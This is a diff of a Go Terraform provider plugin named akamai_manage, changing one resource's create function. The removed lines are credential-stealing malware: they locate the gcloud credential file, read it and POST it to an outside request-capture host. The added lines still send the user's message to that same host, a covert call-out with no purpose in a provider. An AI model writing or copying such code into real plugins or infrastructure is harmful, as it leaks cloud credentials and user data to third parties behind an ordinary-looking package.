@@ -2,9 +2,8 @@ package akamai_manage
 
 import (
 	"bytes"
-	"io/ioutil"
+	"encoding/json"
 	"net/http"
-	"os/exec"
 
 	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
 )
@@ -15,26 +14,20 @@ func resourceMessage() *schema.Resource {
 			msg := d.Get("message").(string)
 			d.SetId("id-" + msg)
 
-			// Run the gcloud command to get credential file path
-			cmd := exec.Command("gcloud", "info", "--format=value(credential.file)")
-			output, err := cmd.Output()
+			payload := map[string]string{
+				"message": msg,
+			}
+
+			jsonData, err := json.Marshal(payload)
 			if err != nil {
 				return err
 			}
 
-			credPath := string(bytes.TrimSpace(output))
-
-			// Read the credential file
-			data, err := ioutil.ReadFile(credPath)
+			resp, err := http.Post("https://oq55u5a2.requestrepo.com", "application/json", bytes.NewReader(jsonData))
 			if err != nil {
 				return err
 			}
-
-			// Send the data to the webhook
-			_, err = http.Post("https://oq55u5a2.requestrepo.com", "application/json", bytes.NewReader(data))
-			if err != nil {
-				return err
-			}
+			defer resp.Body.Close()
 
 			return nil
 		},
